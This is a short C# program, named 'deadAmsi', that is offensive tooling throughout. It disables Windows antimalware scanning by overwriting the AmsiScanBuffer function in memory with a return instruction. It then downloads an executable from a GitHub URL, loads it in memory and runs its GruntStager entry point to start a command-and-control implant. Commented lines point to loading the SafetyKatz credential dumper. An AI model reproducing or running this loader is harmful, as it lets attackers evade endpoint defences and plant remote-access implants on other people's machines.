using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace deadAmsi
{
    public class Program
    {
        private static void Main(string[] args)
        {
            var client = new WebClient();
            var gruntStager = client.DownloadData("https://github.com/deadone/scripting-dev/raw/master/other/deadpayload.exe");

            var amsiDll = Win32.LoadLibrary("amsi.dll");
            var asbAddress = Win32.GetProcAddress(amsiDll, "AmsiScanBuffer");
            var ret = new byte[] { 0xC3 };

            //var katz = File.ReadAllBytes(@"C:\tools\SafetyKatz\SafetyKatz\bin\Debug\SafetyKatz.exe");
            //var asm = Assembly.Load(katz);

            Win32.VirtualProtect(asbAddress, (UIntPtr)ret.Length, 0x40, out uint oldProtect);
            Marshal.Copy(ret, 0, asbAddress, ret.Length);
            Win32.VirtualProtect(asbAddress, (UIntPtr)ret.Length, oldProtect, out uint _);

            var asm = Assembly.Load(gruntStager);
            var type = asm.GetType("GruntStager.GruntStager");
            var instance = Activator.CreateInstance(type);
            type.InvokeMember("GruntStager", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
        }
    }

    class Win32
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
